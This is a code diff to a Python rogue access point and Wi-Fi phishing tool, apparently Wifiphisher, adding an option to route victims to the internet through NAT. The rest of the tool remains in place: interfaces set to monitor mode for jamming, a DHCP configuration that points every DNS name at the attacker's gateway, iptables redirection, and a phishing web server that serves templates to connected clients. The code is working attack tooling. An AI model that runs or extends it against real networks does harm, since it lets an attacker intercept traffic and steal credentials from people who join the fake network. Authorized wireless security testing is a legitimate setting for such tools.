@@ -21,6 +21,7 @@ import phishingpage
 import phishinghttp
 import macmatcher
 import interfaces
+import firewall
 from constants import *
 
 VERSION = "1.2GIT"
@@ -60,6 +61,13 @@ def parse_args():
         help=("Manually choose an interface that supports AP mode for  " +
               "spawning an AP. " +
               "Example: -aI wlan0"
+              )
+    )
+    parser.add_argument(
+        "-iI",
+        "--internetinterface",
+        help=("Choose an interface that is connected on the Internet" +
+              "Example: -iI ppp0"
               )
     )
     parser.add_argument(
@@ -190,29 +198,18 @@ def shutdown(template=None, network_manager=None):
     sys.exit(0)
 
 
-def set_fw_rules():
+def set_ip_fwd():
     """
-    Set iptable rules
+    Set kernel variables.
     """
-    subprocess.call(
-        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s'
-         % (NETWORK_GW_IP, PORT)),
-        shell=True)
-    subprocess.call(
-        ('iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination %s:%s'
-         % (NETWORK_GW_IP, 53)),
-        shell=True)
-    subprocess.call(
-        ('iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination %s:%s'
-         % (NETWORK_GW_IP, 53)),
-        shell=True)
-    subprocess.call(
-        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'
-         % (NETWORK_GW_IP, SSL_PORT)),
-        shell=True)
+    Popen(
+        ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
+        stdout=DN,
+        stderr=PIPE
+    )
 
 
-def set_kernel_var():
+def set_route_localnet():
     """
     Set kernel variables.
     """
@@ -474,11 +471,19 @@ def dhcp_conf(interface):
         'no-resolv\n'
         'interface=%s\n'
         'dhcp-range=%s\n'
-        'address=/#/%s'
+ #       'address=/#/%s'   
     )
 
     with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
-        dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
+        dhcpconf.write(config % (interface, DHCP_LEASE))
+
+    with open('/tmp/dhcpd.conf', 'a+') as dhcpconf:
+        # Instead of args we need to define MODES
+        if args.internetinterface:
+            dhcpconf.write("server=%s" % (PUBLIC_DNS,))
+        else:
+            dhcpconf.write("address=/#/%s" % (NETWORK_GW_IP,))
+
     return '/tmp/dhcpd.conf'
 
 
@@ -811,12 +816,14 @@ def run():
     # Maybe we should save current iptables rules somewhere
 
     network_manager = interfaces.NetworkManager()
-
     mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
+    fw = firewall.Fw() 
 
     # get interfaces for monitor mode and AP mode and set the monitor interface
     # to monitor mode. shutdown on any errors
     try:
+        if args.internetinterface:
+           internet_interface = network_manager.set_internet_iface(args.internetinterface)
         if not args.nojamming:
             if args.jamminginterface and args.apinterface:
                 mon_iface = network_manager.get_jam_iface(
@@ -842,8 +849,6 @@ def run():
                    "rogue Access Point").format(G, W, ap_iface.get_name())
 
         kill_interfering_procs()
-
-        # set monitor mode to monitor interface
         network_manager.set_interface_mode(mon_iface, "monitor")
     except (interfaces.NotEnoughInterfacesFoundError,
             interfaces.JammingInterfaceInvalidError,
@@ -854,9 +859,15 @@ def run():
         time.sleep(2)
         shutdown()
 
-    set_fw_rules()
-    set_kernel_var()
-    network_manager.up_ifaces([ap_iface, mon_iface])
+    if args.internetinterface:
+        fw.nat(ap_iface.get_name(), args.internetinterface)
+        set_ip_fwd()
+    else:
+        fw.redirect_requests_localhost()
+    set_route_localnet()
+
+    if not args.internetinterface:
+        network_manager.up_ifaces([ap_iface, mon_iface])
 
     print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
 
@@ -940,14 +951,15 @@ def run():
            W + ' on ' + T + str(ap_iface.get_name()) + W)
 
     # With configured DHCP, we may now start the web server
+    if not args.internetinterface:
     # Start HTTP server in a background thread
-    print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
-    webserver = Thread(target=phishinghttp.runHTTPServer,
-                       args=(NETWORK_GW_IP, PORT, SSL_PORT, template))
-    webserver.daemon = True
-    webserver.start()
+        print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
+        webserver = Thread(target=phishinghttp.runHTTPServer,
+                           args=(NETWORK_GW_IP, PORT, SSL_PORT, template))
+        webserver.daemon = True
+        webserver.start()
 
-    time.sleep(1.5)
+        time.sleep(1.5)
 
     # We no longer need mac_matcher
     mac_matcher.unbind()
